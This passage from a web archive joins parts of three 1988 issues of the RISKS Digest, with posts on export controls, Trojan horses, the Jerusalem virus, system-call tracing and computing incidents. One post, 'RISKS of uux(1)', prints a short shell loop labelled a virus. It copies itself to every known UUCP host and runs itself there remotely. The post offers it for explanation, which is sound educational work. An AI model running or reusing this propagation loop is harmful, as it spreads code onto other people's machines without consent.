the local Ethernet.  The machines were divided between rooms on the first and
third floors of the building.
     I noticed one day that the machine I sat down at had a wildly inaccurate
time.  Fortunately, the time-initialising code records the machine from which
it received its response;  it can be important to track down bad time
sources.  I checked the record, and trotted downstairs to discover that the
second machine was similarly inaccurate;  its response had come from a third
machine, upstairs.
     The conclusion to this story may be obvious:  I ran up and down the
stairs several times, and discovered that the last machine had received its
time response from the first!  I ended up setting the time by hand.  [It
should be noted that more recent software manages to ask only reliable
time-servers for the time.]

Paul Fuqua, Texas Instruments Computer Science Center, Dallas, Texas
CSNet:  pf@csc.ti.com or pf@ti-csl
UUCP:   {smu, texsun, im4u, rice}!ti-csl!pf

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
 Re: New Year's Sun clock
</A>
</H3>
<address>
Martin Ewing
&lt;<A HREF="mailto:msesys@DEImos.Caltech.Edu ">
msesys@DEImos.Caltech.Edu 
</A>&gt;
</address>
<i>
Mon, 18 Jan 88 14:35:36 PST
</i><PRE>

On the subject of the Sun/new year's clock problem (cf Rayan Zachariasen),
which turned out to result from a mistaken use of C expression side-effects.

  &gt;...many many people were thinking of the careless programmer
  &gt;with warm, sizzling, thoughts.

Personally, I'd reserve a number of "warm, sizzling, thoughts" for the people
who brought us C and Unix, who made this sort of mistake almost inevitable.

    [This message is similar to other RISKS submissions that I have rejected
    in the past.  I include this one as representative of the others, but with
    a serious comment: In this field YOU ARE ALWAYS AT RISK.  If RISKS tells
    you nothing else, it is KNOW AND UNDERSTAND YOUR RISKS.  

    A comment on UNIX and C: Ken Thompson is one of the most brilliant 
    designers and programmers ever to grace this earth.  He developed UNIX
    and C primarily for his own pleasure.  It is not HIS FAULT that UNIX is
    so widely used (e.g., because of its delightful facilities for program
    development and ease of adaptation), or -- by extension -- that it is
    used unwisely in hostile environments despite its not having addressed
    critical security concerns.  A similar argument could be made by people
    who blindly accept free software from a BBOARD (e.g., the PC graphics 
    ARF-ARF Trojan horse) or a Trojan horsey virus, and then complain when
    it destroys all their files.  There are very complex tradeoffs among
    simplicity and ease of use on one hand, and safe systems (in a
    generalized sense) on the other hand.  Know your requirements before you
    start designing, programming, or simply using a computer system.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.10.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.12.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-48</DOCNO>
<DOCOLDNO>IA012-000130-B023-386</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.12.html 128.240.150.127 19970217015227 text/html 25734
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:50:54 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 12</TITLE>
<LINK REL="Prev" HREF="/Risks/6.11.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.13.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.11.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.13.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 12</H1>
<H2> Friday, 22 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks in technology transfer policy 
</A>
<DD>
<A HREF="#subj1.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Trojan-horsed smart terminals? 
</A>
<DD>
<A HREF="#subj2.1">
Tim McDaniel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The virus reaches Israel 
</A>
<DD>
<A HREF="#subj3.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Checking for Trojan Horses and Viruses 
</A>
<DD>
<A HREF="#subj4.1">
Dennis L. Mumaugh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RISKS of uux(1) and trusting remote hosts 
</A>
<DD>
<A HREF="#subj5.1">
Abercrombie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Sheep, Goats, and responding to computer-generated requests 
</A>
<DD>
<A HREF="#subj6.1">
Martin Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Proposal for Fault Tolerance Newsgroup 
</A>
<DD>
<A HREF="#subj7.1">
Don Lee
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks in technology transfer policy
</A>
</H3>
<address>
Alan Wexelblat 
&lt;<A HREF="mailto:wex%SW.MCC.COM@MCC.COM">
wex%SW.MCC.COM@MCC.COM
</A>&gt;
</address>
<i>
Tue, 19 Jan 88 14:48:17 CST
</i><PRE>

One of the RISKS of technology is in attempts to control it.  For the last
seven years, the Reagan Administration has adopted an increasingly
restrictive export licensing policy, aimed at reducing what they see as a
problem of excessive technology transfer to East bloc countries.  However,
this policy and its implementation have their own risks.  Recently, a
National Academy of Sciences panel criticized the policy as "not generally
perceived as rational, credible and predictable."

One victim of this policy is Columbus Instruments, a small company located
in Columbus, Ohio, which specializes in equipment used with animals in
medical research labs.  In June 1985, Dr. Jan Czekajewski, president of the
company, shipped $228,000 worth of lab-animal research equipment to a
medical symposium in Moscow.  Included in the shipment were 5 personal
computers, including a Taiwan-made PC-XT clone.  Dr. Czekajewski didn't
think he needed an export license.

Under the Pentagon's Project Exodus, which was set up to stop shipment of
strategic items to the Soviet bloc, US Customs agents seized the equipment
at Kennedy Airport, descended on Czekajewski's offices, confiscated his
files and notified television stations of the "critical leak of militarily
sensitive technology" narrowly averted by the Customs Service.

Czekajewski went to Eastern Europe to check the availability of microcomputers.
He found the IBM PC-XT and AT computers available in Poland and in Bulgaria he
bought a locally-made PC clone.  After taking it back to Ohio, he discovered
that he would need an export license to ship it back to Bulgaria!

Two and a half years after the original raid, Czekajewski still doesn't have
all his equipment back, and his battles with Customs and the Pentagon have cost
him several hundred thousand dollars in legal fees, time, energy, and lost
sales.

Another victim is Alan Kay.  He was invited by Gosplan, the Soviet central
planning agency, to give a seminar in Moscow and describe how Gosplan could
become more market-oriented.  He wrote to the US Commerce Department and asked
if any license was needed in order to describe software that he had designed
which was commercially available in the US.  He got a letter from Dan Haydosh,
then acting director of the Office of Technology and Policy Analysis,
indicating that the seminar would require an export license since it "presents
a significant risk to our national security."

Readers of the space digest know that many American companies are hurting
because of the lack of launchers for commercial satellites; yet the government
won't allow them to launch on Soviet rockets.  Communications and weather
tracking are both suffering as aging satellites break and can't be repaired or
replaced.

According to the National Academy of Sciences, the Reagan administration
crackdown has essentially failed and is costing the US economy over $9 billion
a year in lost trade.  I frankly don't expect this to get better anytime
sooner.  Comments?

--Alan Wexelblat
UUCP: {harvard, gatech, pyramid, &amp;c.}!sally!im4u!milano!wex

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Trojan-horsed smart terminals?
</A>
</H3>
<address>
Tim McDaniel
&lt;<A HREF="mailto:mcdaniel@uicsrd.csrd.uiuc.edu ">
mcdaniel@uicsrd.csrd.uiuc.edu 
</A>&gt;
</address>
<i>
Wed, 13 Jan 88 01:56:08 CST
</i><PRE>

We just brought up BSD 4.3 (!) on our Vax.  "finger" has been changed, so
that a control character control-x is printed as "^X".  (Actually, it
doesn't come close to doing that, but that's beside the point.)  The list of
changes for 4.3 says that this was done to prevent Trojan horses.  I assume
that this refers to sending control sequences to very "smart" terminals.

Tim McDaniel, Center for Supercomputing Research and Development
at the University of Illinois at Urbana-Champaign

Internet, BITNET:  mcdaniel@uicsrd.csrd.uiuc.edu
UUCP:    {ihnp4,uunet,convex}!uiucuxc!uicsrd!mcdaniel
CSNET:   mcdaniel%uicsrd@uiuc.csnet

    [The bug of squirrelled CTL and ESC sequences was mentioned long ago in
    RISKS, and presumably has been fixed in most sensible systems!  Of course, 
    it still may lurk in non-mail contexts -- including FINGERing someone's 
    Troajn PLAN.  The FINGER vulnerability has not been mentioned explicitly, 
    but is implicit in the earlier discussions.  It is truly a Trojan horse, 
    and even nastier than one contained in received mail -- it is triggered 
    by curiosity on the part of the victim without action on the part of the
    perpetrator.

    By the way, the Christmas Tree "virus" (<A HREF="/Risks/5.79.html">RISKS-5.79</A> ff.) is of course 
    really a Trojan horse with an embedded virus.  The ARF-ARF PC Graphics 
    Trojan horse was also noted a while back.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
The virus reaches Israel                              [See RISKS-6.6]
</A>
</H3>
<address>
Martin Minow THUNDR::MINOW ML3-5/U26 223-9922
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
16 Jan 88 12:00
</i><PRE>

With Nitsan Duvduvani's (nitsan%tav02.dec@decwrl.dec.com) permission, I'm
enclosing an article from an Israeli newspaper on the infamous virus.  The
article is translated by Nitsan, and was sent to me by Aharon Goldman
(goldman%tav02.dec@decwrl.dec.com).  I've lightly copy-edited it.  Martin Minow


 [The following is translated from an article that appeared on "Maariv" (one
  of Israel's most popular daily newspapers) in 8-Jan-1988. I translated it
  myself, so I apologize for the poor style. My own comments appear in brackets
  '[]' within the translated text - Nitsan Duvduvani]


        THE 'COMPUTER AIDS' VIRUS CONTINUES TO RUN WILD:
              'BEWARE OF FRIDAY THE 13-TH OF MAY'

    The Hebrew University [in Jerusalem] published this warning
    yesterday, as on the above date the virus may destroy any
    information found in the computer's memory or on the disks.
    Immunization programs are distributed to locate the virus and
    exterminate it.

        by Tal Shahaf

The computer virus that got the nickname "the Israeli Virus" continues to run
wild. The Hebrew University in Jerusalem spread the warning yesterday: Don't
use your computer on Friday, the 13-th of May this year! On this day the virus
was programmed to wake up from its hibernation - and destroy any information
found in the computer memory or on the disks. Because of this reason, it also
got the nickname "time bomb". Moreover, every 13-th of each month, the virus
will cause a significant slow-down in the computer's response.

Evidences were received by Maariv yesterday for the existence of the virus in
many other places in addition to the Hebrew University in Jerusalem. It was
also reported to be detected in one of the I.D.F. [Israeli Defense Forces]
units using personal computers. Other messages mentioned some commercial
companies where the virus had been detected. An owner of a software house from
Tel-Aviv, who asked to remain anonymous, told that the malfunctions were
detected in software kits that were bought with the computers and were
installed by the selling company.

Eli Shapira, an owner of a computer store from Haifa, tells about infected
software kits that arrived at him from people in the area. The virus also
infected a computer in his store, and possibly spread to customers who had
bought software kits. According to him there was a thorough disinfection
activity that cleared the computer and the diskettes in the store.

Computer experts warn that the virus may now be in any software and in any
computer, including those purchased in computer stores.

Currently, the Hebrew University distributes immunization programs that can
detect the virus in the computer's memory and exterminate it. A new problem
popped up though: A mutation of the virus may show up, a few times as dangerous
as the current virus. It all depends on the source of the virus and whether
the person responsible for it is some computer wizard who did it for fun or
some psychopath who does not control his actions.

        "THE ISRAELI VIRUS" SPREADS AT THE RATE OF AIDS

    The immunization programs fit only the virus from Jerusalem.
    Stopping of unauthorized software copying phenomenon is expected.

        by Tal Shahaf

The model that fits the best the spreading of the computerized virus is the
AIDS virus, so claim computer staff. The resemblance is in all dimensions. The
spreading rate of the virus is amazing. A single infected diskette is
sufficient for infecting thousands of personal computers. It is passed by
diskettes going between computers, and also by telephone communication between
computers. Yesterday it was found out that the virus was much wider spread than
what was thought.

Because of this reason, users are warned not to receive diskettes from unknown
source. First precaution: not to use diskettes without the "computerized
condom": a little sticker that prevents any damage to the information on the
diskette.

The computer community is grateful for stopping the process of unauthorized
copying of software that reached incredible use lately. Exactly like AIDS, that
generated the safe sex phenomenon, the computerized virus is about to generate
the phenomenon of decent use only of software.

The phenomenon of growing infected software was discovered yesterday as a side
effect only. The real damage is the time bomb hidden: Every 13-th of each
month, the virus will cause significant slow down in the computer response, and
in 13-th of May this year it will erase all the information in the computer.

Yuval Rahavi, the computer expert from Jerusalem who discovered the vicious
virus, explains that it is a small and sophisticated computer program. When
the computer is turned on, the program is loaded into the computer memory, and
from now on, any program invoked is contaminated. When the virus identifies
a new program, it joins it without disturbing its activity. From now on, any
use of this software, transferring it to other user, will spread the virus.

The temporary solution to the problem is the immunization programs written by
Rahavi. One is used to detect the virus and the other for prevention. It is
loaded into the computer memory before any other software. If the virus then
attempts to reside in the memory, the program will give appropriate warning.
People from the Hebrew University distributed information that described the
virus for all the computer users at the universities, joined with copies of the
immunization programs.

Ofer Ahituv, an owner of a software house, thinks the source for the virus is
in one of the software houses which became involved with his programmers.
According to him, all his software kits will now be distributed carrying a
label specifying they were checked and found clean of any virus.

The possibility of a new virus, which is more dangerous, scares computer
people.  Such a virus may harm the information, erase it slowly in such a
way that is not detectable. This way, accountants may find out all their
clients accounting data has been erased, banks will lose their customers
data, stores - their cash register data.

The immunization programs are good for fighting the current virus. If a new
virus pops up - these immunizations will be worthless.

Ezra Ben-Kohav, chairman of the computer organization I.O.I.P. [Israeli
Organization for Information Processing] told Maariv yesterday: "There is no
law that defined such action as crime. If the author is caught, there will be
nothing to blame him/her for."

Arie Bender gives the following message: A search team was established in the
Hebrew University, which includes Hilel Bar-Dayan, Amiram Ofir, Eli Peled and
Elisha Ben-Ezra. People in the university asked yesterday to make clear there
was no information or suspicion about the creators of the virus, including
students of the Talpiot program [a special program for young students that
combines army studying].

        THIS IS HOW TO PROTECT YOUR COMPUTER

Yossi Gil, from the computer people who discovered the virus, suggests several
defense activities for the computer users who receive a new diskette and want
to check it.

1. During the check, activate the computer without a hard disk that may be
   infected by the virus.
2. Use diskettes that carry no important information/programs.
3. Invoke the checked software with a diskette protected by a sticker.
4. Invoke the software again with a diskette without a sticker.
5. Compare the two diskettes using a compare program. If no differences are
   found, you may assume the checked diskette is free of the virus.
6. Another rule which is always important: Prepare a copy of any important
   diskette, and specify the date when the copy was done. If the virus attacks
   your computer, you will be able to restore the damaged programs from these
   copies.  (by Tal Shahaf)

        THE VIRUS REACHED HAIFA

The "Israeli virus" was detected, after causing much damage, also in the
educational center of the ministry of education in Rotenberg building on the
Carmel [mountain in Haifa]. There is a computer project going on this site, in
which tens of students participate. The center manager, Gideon Goldstein, and
the project people Michael Hazan and Gadi Kats, told that 6 weeks ago there was
a virus discovered, which destroyed 15 thousand dollars worth of software and 2
disks in which 7000 hours of work had been invested, in an irrecoverable way.
(by Reuven Ben-Zvi)

        PANIC AMONG OWNERS OF PERSONAL COMPUTERS

The Israeli virus panic moved from within the campus and spread out also to the
computer consumers in Jerusalem. In many stores there were customers reporting
symptoms in their home computers, that matched those which had been found in
the P.C. systems in the university. "This morning we ran into and heard about a
few cases", told Emanuel Marinsky, manager of computer services lab, "It raises
panic".  (by Arie Bender)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Checking for Trojan Horses and Viruses -- a partial solution
</A>
</H3>
<address>
&lt;<A HREF="mailto:moss!cuuxb!dlm@RUTGERS.EDU">
moss!cuuxb!dlm@RUTGERS.EDU
</A>&gt;
</address>
<i>
Thu, 7 Jan 88 18:02:04 est
</i><PRE>

In the latest discussions there has been some thought as to how to prevent
viruses and Trojan horses ...

I am now using an internal product called "truss" that inolves the "proc"
file system of UNIX Version 8 (and other developemental versions).

Truss is a system call tracer.  It allows one to examine any process and
observe all system calls.  It lists the system call, and the arguments.
This is done intelligently with translations of arguments to strings and
human format data.  It also gives the return value of the call and
translates error codes into symbolics.  With this product one can watch the
behavior of a program and observe what it does (in a gross level) and who or
what it operates on.

Truss is able to handle the fork/exec of UNIX and follow the children
processes (limited recursion).  Thus one can attach truss to a login shell
and watch a terminal session of a suspect.

Also truss can attach to a process under execution and not related to the
initiator.  Truss can also freeze the process in its tracks and allow
another product (a debugger) more initimate access to the errant process.

The utility as a systems security device AFTER inital suspicion is raised is
obvious.  The RISK?  Applying this to MY operations.  After all who is to
determine what a virus is?

Dennis L. Mumaugh
Lisle, IL       ...!{attunix,ihnp4,cbosgd,lll-crg}!cuuxb!dlm

     [There is also the problem of locking the barn door after the 
     Trojan horse has escaped.  Baled out?  A Trojan cake hidden in a
     file instead of a file hidden in the cake?  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RISKS of uux(1) and trusting remote hosts
</A>
</H3>
<address>
&lt;<A HREF="mailto:sdsu!Abercrombie%minas-morgul.csa.com@sdcsvax.ucsd.edu">
sdsu!Abercrombie%minas-morgul.csa.com@sdcsvax.ucsd.edu
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 23:37:55 GMT
</i><PRE>

There has been much talk recently about viruses and other malevolent
programs.  I will add just one more to the discussion.  It is well known
that the UNIX operating system is not very secure -- it is also well known
that there are many thousands of UNIX machines in place.

The following program owes its operation to the uucp(1) and uux(1) commands.
On most sane systems, the execution of commands using uux is restricted.
But, by contacting every system known to the current host, it is very likely
that some of the system managers have forgotten to plug this simple hole.
There are similar holes that command restriction does not plug, but it would
be a mistake to illucidate further.

I do not advocate that you execute the following program.  It is meant for
expository puposes only.  However, it does not contain any harmful commands
except perhaps that it could flood the network indefinitely.

In closing I would remind everyone that when you connect one machine to
another there is a degree of trust involved.  Many a system has been un-done
by trusting an untrustworthy system -- a simple example would be a faculty
machine connected to a machine accessible to students and have the student
machine mentioned in the /etc/hosts.equiv file.

-- CUT --

#
# A very simple virus.
#
for x in `uuname`
do
	uucp -C /tmp/virus $x\!/tmp/virus
	uux $x\!"sh -c /tmp/virus"
done
rm -f /tmp/virus

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
   Sheep, Goats, and responding to computer-generated requests
</A>
</H3>
<address>
MartinSm 
&lt;<A HREF="mailto:mcvax!minster.york.ac.uk!MartinSm@uunet.UU.NET">
mcvax!minster.york.ac.uk!MartinSm@uunet.UU.NET
</A>&gt;
</address>
<i>
17 Jan 1988 20:38:14 GMT
</i><PRE>

I don't know how these things work in America but over here forms are sent
out each year to register to vote in elections and by law they *MUST* be
completed. This year another form was sent out in the same envelope, computer
printed and requesting information such as the number of people in the house
of 'Ethnic Origin' or Unemployed or Disabled. Nowhere on the form did it say
that it was nothing to do with the electoral register and had no legal status.
It had been issued by our local council (Leeds) and contained a suspicious
looking code number in the corner which could be used to discover which
household had filled it in. Though no address was printed which would have made
this obvious.

Naturally the form went in the bin immediately. A couple of weeks later a
letter arrived saying in essence that we had been *RANDOMLY* chosen from
a *SMALL* number of people who were being uncooperative. We were to be
visited by someone who was going to get us to fill it in. As yet this has
not occurred but if it does they are not getting past the door.

The situation becomes more interesting when you know that there was a scandal
involving council officers writing to department heads and asking for their 
master passwords. This information was usually provided, on the pre-printed
form, without question.

This is the "sheep" factor again. It seems to be becoming increasingly common
for people to request information for nefarious, nonessential or unexplained
reasons. I think we have a lot to worry about. Especially in a country like the
UK where it is much easier to put data into officials' hands than to get it 
out of them.
  
Martin Smith, Langwith College, University Of York, 
Heslington, York, YO1 5DD England

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Proposal for Fault Tolerance Newsgroup
</A>
</H3>
<address>
Don Lee
&lt;<A HREF="mailto:trwrb!dlee@aero.arpa ">
trwrb!dlee@aero.arpa 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 5 Jan 88 21:41:00 GMT
Reply-To: trwrb!aero!dlee@ucbvax.Berkeley.EDU (Don Lee)
Organization: The Aerospace Corporation, El Segundo, CA

     I would like to propose the formation of a new newsgroup,
comp.fault_tolerance, that would discuss technical issues releated to fault
tolerance.  Such a newsgroup is needed, since there is no current newsgroup
that discusses the technical issues involved in fault-tolerant computing.
Fault tolerance is an extremely diversified area of computing that is not only
concerned with hardware and software, but also with, to name a few,
interconnection networks, real-time systems, parallel and alternative
architectures, and data base systems.  Issues also involve modeling (including
automated reliability models such as CARE III, HARP, ARIES, and CRAFTS)
and simulation of fault-tolerant systems.  Since fault-tolerant computing is
such a diversified area it is easy to imagine that such a large volume of
articles would be posted that the average reader would have a difficult time
keeping up.  Therefore, the newsgroup should be moderated.  I am willing to be
the group moderator.

     If anyone has any comments regarding the name and nature of the group
please post them to news.groups.  I will answer them as soon as possible.
Please send any votes for or against the group to me personally.  I hope that
the group will be formed very shortly, and I look forward to the interesting
and informative articles that I am sure will be posted to comp.fault_tolerance.

 Thank you,  Don Lee

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.11.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.13.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-49</DOCNO>
<DOCOLDNO>IA012-000130-B023-410</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.13.html 128.240.150.127 19970217015242 text/html 23722
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:51:08 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 13</TITLE>
<LINK REL="Prev" HREF="/Risks/6.12.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.14.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.12.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.14.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 13</H1>
<H2> Sunday, 24 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
U.S. Fears Satellites Damaged 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Signal-light malfunction blamed in L.A. train wreck 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Big Error on Benefits by a State Computer 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  London Underground Ticket Machine fraud 
</A>
<DD>
<A HREF="#subj4.1">
John Pettitt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The responsibility of and for `bringing us C and Unix' 
</A>
<DD>
<A HREF="#subj5.1">
Geraint Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Risks in technology transfer policy 
</A>
<DD>
<A HREF="#subj6.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Technology transfer policy and Halley's Comet probe 
</A>
<DD>
<A HREF="#subj7.1">
Alex Colvin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Non-ionizing radiation 
</A>
<DD>
<A HREF="#subj8.1">
John Nowack
</A><br>
<A HREF="#subj8.2">
 Jonathan Thornburg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Books about SDI software -- a request 
</A>
<DD>
<A HREF="#subj9.1">
Dan Jones
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
U.S. Fears Satellites Damaged
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Sun 24 Jan 88 14:10:34-PST
</i><PRE>

Subtitle -- Soviets used lasers to cripple equipment, sources contend.

Washington, by Richard Sale (UPI, 24 January 1988).

U.S. intelligence agencies are convinced Soviet laser attacks have damaged
supersophisticated U.S. spy satellites deployed to monitor missile and
spacecraft launches, administration sources said.  These sources said they
believe the Soviets fired ground-based lasers to cripple optical equipment
attempting to scan launches at Tyuratam, the major Soviet space center, to
obtain a variety of sensitive military information.  Administration
intelligence sources said they fear that other vital U.S. reconnaissance
satellites will soon be endangered because six new Soviet laser battle stations
are under construction...  "There is no way you can protect the optical sensors
on satellites" from laser attacks, an Air Force official said. ...

Intelligence sources acknowledged that the Pentagon also has trained
ground-based lasers on Soviet spacecraft, sometimes in attempts to disrupt
their sensors. ...

  [From the San Francisco Examiner and Chronicle, front page, 24 Jan 88.  The
  article goes on to consider reports that some spacecraft malfunctions may
  have been due to laser "hosing", e.g., a KH-11 or Code 1010 satellite, which
  was permanently damaged in 1978.  Seems unlikely -- the technology was not
  very well advanced then?  PGN]

  [However, the risks of laser interference or accidental triggering are worth
  noting.  Adding to the risks of computing in SDI, might such a concerted
  attack of simultaneous laser bursts on many satellite sensors be mistakenly
  detected as the launch of a nuclear attack!?  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Signal-light malfunction blamed in L.A. train wreck
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
